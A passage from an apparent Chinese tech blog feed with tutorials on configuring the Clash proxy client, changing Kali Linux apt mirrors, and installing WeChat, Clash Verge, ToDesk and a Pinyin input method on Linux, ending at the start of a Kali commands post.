<h2 id="启动-Clash-for-Windows"><a href="#启动-Clash-for-Windows" class="headerlink" title="启动 Clash for Windows #"></a>启动 Clash for Windows <a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8-clash-for-windows"><em>#</em></a></h2><p>首次启动 Clash for Windows 后出现如下图所示表示启动成功。如果左下角 <code>connected</code> 不是绿色状态则表示启动失败。</p>
<p><a href="https://clashforwindows.app/images/cfw-start.png"><img src="/img/clashforwindows/1.webp" alt="启动Clash for Windows"></a></p>
<h2 id="导入Clash标准订阅"><a href="#导入Clash标准订阅" class="headerlink" title="导入Clash标准订阅 #"></a>导入Clash标准订阅 <a href="https://clashforwindows.app/#%E5%AF%BC%E5%85%A5clash%E6%A0%87%E5%87%86%E8%AE%A2%E9%98%85"><em>#</em></a></h2><p>导入配置文件有如下两个途径：</p>
<ul>
<li><a href="https://clashforwindows.app/#url%E5%AF%BC%E5%85%A5">URL 导入</a></li>
<li><a href="https://clashforwindows.app/#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%8B%96%E6%8B%BD%E5%AF%BC%E5%85%A5">本地文件拖拽导入</a></li>
</ul>
<p>一般情况下，URL 及配置文件都由机场代理服务商提供复制或下载。 如果您自建了节点，可以随便找个机场的配置下载下来修改对应的配置文件。以本地文件拖拽的方式使用自建节点。</p>
<h3 id="通过URL导入Clash配置"><a href="#通过URL导入Clash配置" class="headerlink" title="通过URL导入Clash配置 #"></a>通过URL导入Clash配置 <a href="https://clashforwindows.app/#%E9%80%9A%E8%BF%87url%E5%AF%BC%E5%85%A5clash%E9%85%8D%E7%BD%AE"><em>#</em></a></h3><p><a href="https://clashforwindows.app/images/clash-for-windows-url-import.png"><img src="/img/clashforwindows/2.webp" alt="clash for windows url导入"></a></p>
<h3 id="通过本地文件拖拽导入Clash配置"><a href="#通过本地文件拖拽导入Clash配置" class="headerlink" title="通过本地文件拖拽导入Clash配置 #"></a>通过本地文件拖拽导入Clash配置 <a href="https://clashforwindows.app/#%E9%80%9A%E8%BF%87%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%8B%96%E6%8B%BD%E5%AF%BC%E5%85%A5clash%E9%85%8D%E7%BD%AE"><em>#</em></a></h3><p>自建节点服务器需要自行编辑配置文件并导入,示例配置文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxies:</span><br><span class="line">    - &#123; name: &#x27;Trojan节点名称&#x27;, type: trojan, server: 节点服务器地址, port: 端口号, password: Trojan密码, udp: true, sni: 节点服务器地址, skip-cert-verify: true &#125;</span><br><span class="line">    - &#123; name: &#x27;V2Ray节点名称&#x27;, type: vmess, server: 节点服务器地址, port: 端口号, uuid: V2Ray UUID, alterId: 0, cipher: auto, udp: true, tls: true, network: tcp, sni: 节点服务器地址, skip-cert-verify: true &#125;</span><br><span class="line">proxy-groups:</span><br><span class="line">    - &#123; name: 自建节点, type: select, proxies: [自动选择, 故障转移, &#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;] &#125;</span><br><span class="line">    - &#123; name: 自动选择, type: url-test, proxies: [&#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;], url: &#x27;http://www.gstatic.com/generate_204&#x27;, interval: 86400 &#125;</span><br><span class="line">    - &#123; name: 故障转移, type: fallback, proxies: [&#x27;Trojan节点名称&#x27;, &#x27;V2Ray节点名称&#x27;],url: &#x27;http://www.gstatic.com/generate_204&#x27;, interval: 7200 &#125;</span><br></pre></td></tr></table></figure>

<p>Clash for Windows 支持拖拽导入，直接将本地配置文件拖拽至配置界面中即可，如下图所示：</p>
<p><a href="https://clashforwindows.app/images/clash-for-windows-import.webp"><img src="/img/clashforwindows/3.png" alt="clash for windows手动导入"></a></p>
<h2 id="选择Clash节点"><a href="#选择Clash节点" class="headerlink" title="选择Clash节点 #"></a>选择Clash节点 <a href="https://clashforwindows.app/#%E9%80%89%E6%8B%A9clash%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>不同的机场服务商提供的配置不同，但大体操作逻辑是一样的。此处以我自用的机场举例。</p>
<p>点击 Proxies → 选择 Rule → 点击 🚀 节点选择 展开节点列表 → 选择一个节点</p>
<p><a href="https://clashforwindows.app/images/clash-for-windows-select-node.png"><img src="/img/clashforwindows/4.webp" alt="clash for windows选择节点"></a></p>
<p>代理模式</p>
<ul>
<li>全局（Global）：所有请求直接发往代理服务器</li>
<li>规则（Rule）：所有请求根据配置文件规则进行分流</li>
<li>直连（ Direct ）：所有请求直接发往目的地</li>
</ul>
<p>一般机场的规则模式基本涵盖了我们大多数人想要接入的国际互联网服务网址，小众群体如果有特殊要求可以选择全局模式。</p>
<p>📍📍 注意：全局模式可能会导致国内流量也走代理访问，除了网络会变慢外，还会消耗套餐流量。规则模式的好处就是区分国内国外的流量只有在规则内的国外网站才会走代理，这样即不影响国内访问速度，又节省套餐流量。</p>
<h2 id="启动Clash-for-Windows代理"><a href="#启动Clash-for-Windows代理" class="headerlink" title="启动Clash for Windows代理 #"></a>启动Clash for Windows代理 <a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8clash-for-windows%E4%BB%A3%E7%90%86"><em>#</em></a></h2><p>点击 General → 打开 SystemProxy 开关,启动代理服务即可接入国际互联网。</p>
<p><a href="https://clashforwindows.app/images/clash-for-windows-start-service.png"><img src="/img/clashforwindows/5.webp" alt="clash for windows start service"></a></p>
<h2 id="检查代理"><a href="#检查代理" class="headerlink" title="检查代理 #"></a>检查代理 <a href="https://clashforwindows.app/#%E6%A3%80%E6%9F%A5%E4%BB%A3%E7%90%86"><em>#</em></a></h2><p>开启系统代理后，打开浏览器，先 <strong>打开一个无痕窗口(排除插件干扰)</strong> 访问一下Google看能否正常访问。如果Google访问正常那说明代理配置没问题。代理开启来以后可以通过 <a href="https://yestool.org/my-ip-search/">🔗<strong>我的 IP 地址查询_我的 IP_IP 查询</strong></a> 查看节点 ip 地址。</p>
<h2 id="Clash-for-Windows节点"><a href="#Clash-for-Windows节点" class="headerlink" title="Clash for Windows节点 #"></a>Clash for Windows节点 <a href="https://clashforwindows.app/#clash-for-windows%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>要使用代理上网功能，我们需要在软件中添加一个服务器节点，也称为机场节点。这类节点一般都是机场主购买服务器搭建好的服务，即买即用。在使用 Clash for Windows 之前，请确保至少拥有一个节点。 <a href="https://cn.bing.com/search?q=%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9">查找机场节点</a></p>
<h3 id="免费体验节点"><a href="#免费体验节点" class="headerlink" title="免费体验节点 #"></a>免费体验节点 <a href="https://clashforwindows.app/#%E5%85%8D%E8%B4%B9%E4%BD%93%E9%AA%8C%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>一般很少有机场主提供纯免费的节点，大多是提供一定时间的体验时长和体验流量，然后顺带着推荐自己的付费套餐，纯纯免费的反而要小心，羊毛出在羊身上。如果真需要免费的Clash for Windows节点，可以通过搜索引擎查找。 使用时最好不要涉及自己的用户隐私。尤其时关于金钱的操作要慎之又慎。</p>
<h3 id="付费机场节点"><a href="#付费机场节点" class="headerlink" title="付费机场节点 #"></a>付费机场节点 <a href="https://clashforwindows.app/#%E4%BB%98%E8%B4%B9%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>付费节点更加稳定，在不同的网络环境下能够保持相对一致的用户体验。所以有调节的话还是推荐选择付费节点，一般来讲 20元左右&#x2F;100G&#x2F;月 是相对普遍的价格。您可以根据自己的钱包状况选择适合自己的套餐。</p>
<p><a href="https://cn.bing.com/search?q=%E6%9C%BA%E5%9C%BA%E8%8A%82%E7%82%B9">查找机场节点</a></p>
<p>机场节点还有要注意一点，就是再便宜的优惠折扣，我们订阅付费周期不要超过一年，我们可以到期再续，防止被割韭菜——买了了2、3年的套餐后机场跑路。</p>
<h3 id="vps自建节点"><a href="#vps自建节点" class="headerlink" title="vps自建节点 #"></a>vps自建节点 <a href="https://clashforwindows.app/#vps%E8%87%AA%E5%BB%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h3><p>如果对节点的稳定性、隐私性要求较高，且具备一定的技术基础的用户，我们建议自行搭建节点。这样可以保证代理速度和安全性最高。</p>
<p>请注意，搭建节点需要一定的技术能力，因为自建节点的话容易被封，需要额外SSH链接、配置协议、套cdn等操作。不建议新手尝试。</p>
<p><a href="https://cloudvpshub.net/">购买vps云主机</a></p>
<h2 id="Cloudflare-自建节点"><a href="#Cloudflare-自建节点" class="headerlink" title="Cloudflare 自建节点 #"></a>Cloudflare 自建节点 <a href="https://clashforwindows.app/#cloudflare-%E8%87%AA%E5%BB%BA%E8%8A%82%E7%82%B9"><em>#</em></a></h2><p>通过 Cloudflare Workers 自建节点，可以让我们替代传统的 VPS 翻墙代理繁琐的搭建过程。Cloud Workers 提供的免费套餐，存在 10 万&#x2F;天的请求次数限制，但对于个人用户或小型项目来说，这通常是足够的。</p>
<p>得益于 Cloudflare 的全球网络基础设施，与自建 VPS 相比，Cloudflare Workers 能够利用 Cloudflare 的边缘计算资源，让用户的请求在离他们最近的数据中心处理，从而实现更快的内容加载速度和更低的响应时间。</p>
<p>[Cloudflare 自建节点教程](<a href="https://cn.bing.com/search?q=%E4%BD%BF%E7%94%A8">https://cn.bing.com/search?q=使用</a> Cloudflare Workers 自建节点)</p>
<h2 id="Clash-for-Windows常见问题"><a href="#Clash-for-Windows常见问题" class="headerlink" title="Clash for Windows常见问题 #"></a>Clash for Windows常见问题 <a href="https://clashforwindows.app/#clash-for-windows%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><em>#</em></a></h2><h3 id="clash-for-windows支持哪些协议？"><a href="#clash-for-windows支持哪些协议？" class="headerlink" title="clash for windows支持哪些协议？ #"></a>clash for windows支持哪些协议？ <a href="https://clashforwindows.app/#clash-for-windows%E6%94%AF%E6%8C%81%E5%93%AA%E4%BA%9B%E5%8D%8F%E8%AE%AE"><em>#</em></a></h3><p>答:支持 Shadowsocks(SS)、Socks、Snell、V2Ray、Trojan 等代理协议。自 v0.11.2 开始，开始支持 ShadowsocksR(SSR)。</p>
<h2 id="clash-for-windows界面显示不全无法操作？"><a href="#clash-for-windows界面显示不全无法操作？" class="headerlink" title="clash for windows界面显示不全无法操作？ #"></a>clash for windows界面显示不全无法操作？ <a href="https://clashforwindows.app/#clash-for-windows%E7%95%8C%E9%9D%A2%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%85%A8%E6%97%A0%E6%B3%95%E6%93%8D%E4%BD%9C"><em>#</em></a></h2><p>答:删除软件主目录的 config.yml 文件并重启软件即可。</p>
<h3 id="Windows系统中，TUN-模式下无法使用热点分享功能怎么办？"><a href="#Windows系统中，TUN-模式下无法使用热点分享功能怎么办？" class="headerlink" title="Windows系统中，TUN 模式下无法使用热点分享功能怎么办？ #"></a>Windows系统中，TUN 模式下无法使用热点分享功能怎么办？ <a href="https://clashforwindows.app/#windows%E7%B3%BB%E7%BB%9F%E4%B8%ADtun-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%E7%83%AD%E7%82%B9%E5%88%86%E4%BA%AB%E5%8A%9F%E8%83%BD%E6%80%8E%E4%B9%88%E5%8A%9E"><em>#</em></a></h3><p>解决方法如下：</p>
<ul>
<li>开启热点分享功能，此时系统网络设置中会生成一个网卡</li>
<li>开启 TUN 模式</li>
<li>进入系统网络设置，在 Clash 网卡右键选择属性，选择共享标签页</li>
<li>勾选“允许其他网络用户通过此计算机的 Internet 连接来连接”</li>
<li>在“家庭网络连接”选择框中选择第 1 步生成的网卡</li>
</ul>
<h2 id="Clash-for-Windows-注意事项"><a href="#Clash-for-Windows-注意事项" class="headerlink" title="Clash for Windows 注意事项 #"></a>Clash for Windows 注意事项 <a href="https://clashforwindows.app/#clash-for-windows-%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><em>#</em></a></h2><p>1、不要泄露节点个人专属配置文件，以防止他人使用及知晓你的密码。</p>
<p>2、建议定期手动更新或者设置成启动时自动更新订阅，即可保持与服务器同步更新。</p>
<p>3、Clash for Windows 如果出现 BUG,删掉软件重新下一次并重新配置，还不行就用下面最佳替代。</p>
<h2 id="Clash-for-Windows-最佳替代"><a href="#Clash-for-Windows-最佳替代" class="headerlink" title="Clash for Windows 最佳替代 #"></a>Clash for Windows 最佳替代 <a href="https://clashforwindows.app/#clash-for-windows-%E6%9C%80%E4%BD%B3%E6%9B%BF%E4%BB%A3"><em>#</em></a></h2><p>由于Clash for windows 已经删库不再维护，虽然当前来看使用完全没问题，但是后续如果内核增加新特性那就没法支持了。所以已经有新的接替者： <a href="https://clash-verge.com/">🌟全开源Clash for windows替代：clash verge🌟</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>hack</tag>
        <tag>clash</tag>
        <tag>leak</tag>
      </tags>
  </entry>
  <entry>
    <title>kali更换镜像源</title>
    <url>/posts/db6f2bc4/</url>
    <content><![CDATA[<p>1.进入管理员下的控制台。</p>
<p>2.输入密码后点击“授权”。</p>
<p>3.在控制台内输入下面的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>4.敲击回车后会进入下面的页面。</p>
<p>5.来到这个页面后的第一部是按键盘上的“i”键，左下角出现“插入”后说明操作正确。</p>
<p>6.使用“#”将原本的源给注释掉。</p>
<p>7.从下面的源内选择一个复制下来准备粘贴进去（都是优质源，复制哪个都可以）。</p>
<p>中科大Kali镜像源（推荐）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>阿里云Kali镜像源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>清华大学Kali镜像源</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

<p>8.将上面复制的源粘贴到下图所示位置。</p>
<p>9.按键盘上的“ESC”键，左下角的“插入”消失说明操作正确。</p>
<p>10.输入“:wq!”（注意使用英文输入法），这步操作是保存配置并退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:wq!</span><br></pre></td></tr></table></figure>

<p>11.回车后便成功保存并退出了。</p>
<p>12.之后执行下面的命令更新源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<p>13.回车后等待即可，约一分钟，出现下面页面即更新成功了。</p>
<p>14.接下来可以使用下面的命令来对软件进行更新（如果不需要更新则可以忽略下面内容）。</p>
<p>命令1： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>

<p>命令2： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<p>上面两条命令均是用来更新所有软件的，不同的是： 它能识别新版本的依赖关系， 将不要的依赖进行卸载， 将需要升级的依赖进行升级。</p>
<p>注：</p>
<p>在更新软件期间可能会需要确认、配置、显示更新日志等，按照提示操作即可。</p>
<p>15.安装或更新完成后，会遗留一些软件的安装包，会占用部分硬盘空间，可使用下面的命令来对其进行清理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure>

<p>组合命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>kali,ubuntu,debian,centos安装linux版微信</title>
    <url>/posts/685a2905/</url>
    <content><![CDATA[<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>第一步，在微信官方网站 <a href="https://weixin.qq.com/">https://weixin.qq.com/</a> 选择Linux版本</p>
<p><img src="/img/wechat_linux/1.webp" alt="在这里插入图片描述"><br>第二步，选择X86版deb安装包<br><img src="/img/wechat_linux/2.webp" alt="在这里插入图片描述"><br>第三步,在下载路径下用命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i WeChatLinux_x86_64.deb</span><br></pre></td></tr></table></figure>

<p>进行安装，大功告成！！！<br><img src="/img/wechat_linux/3.webp" alt="在这里插入图片描述"></p>
<h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="/img/wechat_linux/4.webp" alt="在这里插入图片描述"><br>windows版微信支持的，linux版本的也都能支持，看一看，搜一搜，小程序等都支持,功能齐全。之前缺失的功能，朋友圈功能已上线！赶紧去体验吧小伙伴们~~<br><img src="/img/wechat_linux/5.webp" alt="在这里插入图片描述"></p>
<h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><p>原来的微信卸载方式：<br>1、查询wechat相关apk命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dpkg --list | grep wechat</span><br></pre></td></tr></table></figure>

<p><code>2、卸载wechat相关apk命令：</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --remove com.tencent.wechat</span><br><span class="line">sudo dpkg --remove electronic-wechat-icons-atzlinux</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装clashverge</title>
    <url>/posts/3c83cc33/</url>
    <content><![CDATA[<p>环境: Kali Linux 2024.3 amd64</p>
<p>Clash Verge 项目地址：<a href="https://github.com/clash-verge-rev/clash-verge-rev">clash-verge-rev&#x2F;clash-verge-rev: Continuation of Clash Verge - A Clash Meta GUI based on Tauri (Windows, MacOS, Linux)</a></p>
<p>安装包地址：<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases">Releases · clash-verge-rev&#x2F;clash-verge-rev</a></p>
<p>节点转换工具：<a href="https://v2rayse.com/node-convert">V2Ray节点转换工具 | 免费VPN节点分享与管理平台</a></p>
<p>另一个代理工具nekoray：<a href="https://github.com/Matsuridayo/nekoray/releases">Releases · MatsuriDayo&#x2F;nekoray</a></p>
<p>使用dpkg安装clash-verge报错如下,缺少libwebkit2gtk-4.0-37依赖</p>
<p><img src="/img/clashverge/1.webp" alt="请添加图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Unsatisfied dependencies:</span><br><span class="line"> libjavascriptcoregtk-4.0-18 : Depends: libicu74 (&gt;= 74.1-1~) but it is not installable</span><br><span class="line"> libwebkit2gtk-4.0-37 : Depends: libicu74 (&gt;= 74.1-1~) but it is not installable</span><br><span class="line">                        Depends: libjpeg8 (&gt;= 8c) but it is not installable</span><br></pre></td></tr></table></figure>

<p>参考官网<a href="https://www.clashverge.dev/faq/linux.html#ubuntu-2404">Ubuntu 24.04 版本无法正常安装</a></p>
<p>使用wget拉取<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases/download/dependencies/libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb">libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb</a>和<a href="https://github.com/clash-verge-rev/clash-verge-rev/releases/download/dependencies/libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb">libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb</a></p>
<p>再使用apt安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install ./libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb ./libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb</span><br></pre></td></tr></table></figure>

<p>报错如下,缺少libicu74和libjpeg8</p>
<p><img src="/img/clashverge/2.webp" alt="请添加图片描述"></p>
<p>参考<a href="https://www.reddit.com/r/linux4noobs/comments/1adnavi/libjpeg8_is_not_installable/">libjpeg8 is not installable</a>和 <a href="https://pkg.kali.org/pkg/libjpeg8">https://pkg.kali.org/pkg/libjpeg8</a> , kali源的libjpeg8支持似乎已被移除</p>
<p>于是通过 <a href="https://ubuntu.pkgs.org/">https://ubuntu.pkgs.org/</a> 搜索并下载相关依赖(libjpeg8依赖libjpeg-turbo8), wget拉取后使用apt安装即可</p>
<p>下载链接如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/libj/libjpeg-turbo/libjpeg-turbo8_2.0.3-0ubuntu1_amd64.deb</span><br><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/libj/libjpeg8-empty/libjpeg8_8c-2ubuntu8_amd64.deb</span><br><span class="line">http://archive.ubuntu.com/ubuntu/pool/main/i/icu/libicu74_74.2-1ubuntu3_amd64.deb</span><br></pre></td></tr></table></figure>

<p>综上所述,安装顺序如下:</p>
<ol>
<li>wget拉取,apt安装libjpeg-turbo8, libjpeg8_8c, libicu74</li>
<li>wget拉取,apt安装libwebkit2gtk和libjavascriptcoregtk</li>
<li>dpkg安装clash-verge</li>
</ol>
<p><img src="/img/clashverge/3.webp" alt="请添加图片描述"></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>os</category>
        <category>kali</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
        <tag>clash</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装远程控制桌面todesk</title>
    <url>/posts/ee11d60/</url>
    <content><![CDATA[<h3 id="Debian-Ubuntu-Mint"><a href="#Debian-Ubuntu-Mint" class="headerlink" title="Debian&#x2F;Ubuntu&#x2F;Mint"></a>Debian&#x2F;Ubuntu&#x2F;Mint</h3><p>deb package:<a href="https://dl.todesk.com/linux/todesk-v4.7.2.0-amd64.deb">https://dl.todesk.com/linux/todesk-v4.7.2.0-amd64.deb</a></p>
<p>立即下载</p>
<p>（使用4.7.2.0覆盖安装后，临时密码将会变更）</p>
<h4 id="安装命令："><a href="#安装命令：" class="headerlink" title="安装命令："></a>安装命令：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ./todesk-v4.7.2.0-amd64.deb</span><br></pre></td></tr></table></figure>

<h4 id="启动命令："><a href="#启动命令：" class="headerlink" title="启动命令："></a>启动命令：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">todesk</span><br></pre></td></tr></table></figure>

<h4 id="如不能正常使用-请执行以下命令初始化"><a href="#如不能正常使用-请执行以下命令初始化" class="headerlink" title="如不能正常使用,请执行以下命令初始化."></a>如不能正常使用,请执行以下命令初始化.</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop todeskd.service</span><br><span class="line">sudo <span class="built_in">mv</span> /opt/todesk/config/config.ini /opt/todesk/config/config.ini.bak</span><br><span class="line">sudo systemctl start todeskd.service</span><br></pre></td></tr></table></figure>

<h4 id="排查错误可执行以下命令看日志"><a href="#排查错误可执行以下命令看日志" class="headerlink" title="排查错误可执行以下命令看日志:"></a>排查错误可执行以下命令看日志:</h4><h4 id="查看服务日志：（例如-xxxx-xx-xx-log为2022-08-03-log）"><a href="#查看服务日志：（例如-xxxx-xx-xx-log为2022-08-03-log）" class="headerlink" title="查看服务日志：（例如:xxxx_xx_xx.log为2022_08_03.log）"></a>查看服务日志：（例如:xxxx_xx_xx.log为2022_08_03.log）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/todesk/service_xxxx_xx_xx.log</span><br></pre></td></tr></table></figure>

<h4 id="查看客户端日志：（例如-xxxx-xx-xx-log为2022-08-03-log）"><a href="#查看客户端日志：（例如-xxxx-xx-xx-log为2022-08-03-log）" class="headerlink" title="查看客户端日志：（例如:xxxx_xx_xx.log为2022_08_03.log）"></a>查看客户端日志：（例如:xxxx_xx_xx.log为2022_08_03.log）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f ~/.local/share/todesk/Logs/client_xxxx_xx_xx.log</span><br></pre></td></tr></table></figure>

<h4 id="删除服务设置配置"><a href="#删除服务设置配置" class="headerlink" title="删除服务设置配置:"></a>删除服务设置配置:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /opt/todesk/config/config.ini</span><br></pre></td></tr></table></figure>

<h4 id="卸载"><a href="#卸载" class="headerlink" title="卸载:"></a>卸载:</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove --purge todesk</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装中文输入法谷歌拼音google pinying</title>
    <url>/posts/4f1e28f3/</url>
    <content><![CDATA[<p>如果你是刚安装完系统，建议先去更新自己kali源，以下内容全部是基于kali源更新执行进行的。<br>很多新手朋友安装kali以后想使用中文输入法，但是奈何怎么折腾也弄不出来，今天正好需要安装kali就简单做一个记录，希望对你有所帮助，还请路过大牛指出不足！</p>
<h2 id="1-sudo-su"><a href="#1-sudo-su" class="headerlink" title="1.sudo su"></a>1.sudo su</h2><p><img src="/img/fcitx/1.webp" alt="img"></p>
<h2 id="2-更新源"><a href="#2-更新源" class="headerlink" title="2.更新源"></a>2.更新源</h2><p>输入命令 vi &#x2F;etc&#x2F;apt&#x2F;sources.list</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src shttp://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<h2 id="3-更新软件源和软件"><a href="#3-更新软件源和软件" class="headerlink" title="3.更新软件源和软件"></a>3.更新软件源和软件</h2><p>输入命令 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get upgrade</span><br></pre></td></tr></table></figure>

<p>输入命令 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get clean</span><br></pre></td></tr></table></figure>

<p>注释：<br>apt-get update 用于同步远程仓库中的软件列表，以便让 apt-get 知道软件的最新状态，是否可更新。<br>apt-get upgrade 用于更新所有已经在系统安装的软件，如果更新软件需要更改其它软件的状态，如需要降级，则不更新软件。</p>
<p><strong>1、 安装输入法输入法框架</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx</span><br></pre></td></tr></table></figure>

<p><strong>2、 下载好以后，程序中会多出下面两个图标</strong><br><img src="/img/fcitx/2.webp" alt="在这里插入图片描述"><br><strong>3、 现在安装一个中文输入法google输入法</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install fcitx-googlepinyin</span><br><span class="line">reboot      <span class="comment">#重启系统</span></span><br></pre></td></tr></table></figure>

<p><strong>4、 点击fcitx配置，可以看到Google拼音，如果没有点击左下角的+进行搜索</strong><br><img src="/img/fcitx/3.webp" alt="在这里插入图片描述"><br><strong>5、 如果出现多种输入法，将Google添加到第一位作为默认输入法，点击下方的上下箭头可以调整</strong><br><img src="/img/fcitx/4.webp" alt="在这里插入图片描述"><br><strong>6、 点击全局配置即可进行进行快捷键等功能配置</strong><br><img src="/img/fcitx/5.webp" alt="在这里插入图片描述"><br><strong>7、 测试结果</strong><br><img src="/img/fcitx/6.webp" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>hack</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>kali基础命令</title>
    <url>/posts/d5974ca6/</url>
    <content><![CDATA[<p>前言：Linux命令数量非常庞大，往往需要在使用的时候进行查找，但是网络上资料繁杂，就笔者的观感而言，很难找到一份既有命令的用法也有参数的介绍，同时还可以提供一些简单示例的的高质量文章，因此本篇文章应运而生。本文按照命令的使用类型和场景进行了分类，相信可以使笔者更快速的查找和理解需要用到的命令。</p>
<p>目录</p>
